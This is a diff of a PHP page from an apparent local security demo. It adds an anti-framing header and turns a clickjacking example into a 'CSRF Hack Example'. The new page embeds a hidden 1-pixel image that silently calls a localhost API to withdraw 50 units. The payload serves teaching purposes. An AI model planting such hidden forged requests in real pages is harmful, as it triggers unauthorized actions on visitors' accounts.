@@ -8,26 +8,30 @@
 require_once "common.php";
 
 
+header('X-Frame-Options: deny');
+//header('X-Frame-Options: SAMEORIGIN');
+//header('X-Frame-Options: ALLOW-FROM https://localhost:2080/');
+
 ?>
 
 <!doctype html>
 <html lang="en">
 <head>
 	<meta charset="utf-8">
-	<title>Clickjacking Example</title>
+	<title>CSRF Hack Example</title>
 	<link rel="stylesheet" href="css/bootstrap.min.css">
 	<link rel="stylesheet" href="css/main.css">
 
 	<script type="text/javascript" src="js/jquery.min.js"></script>
+	
 </head>
 
 <body>
 
-<h1>Clickjacking</h1>
+<h1>Something Has Happen?</h1>
 
-<div>
-
-<iframe style="width:800px; height:600px" id="box"></iframe>
+<div id="result">
+<img src="http://localhost:2080/secure/api.php?type=2&withdraw=50" style="width:1px;height:1px">
 </div>
 
 
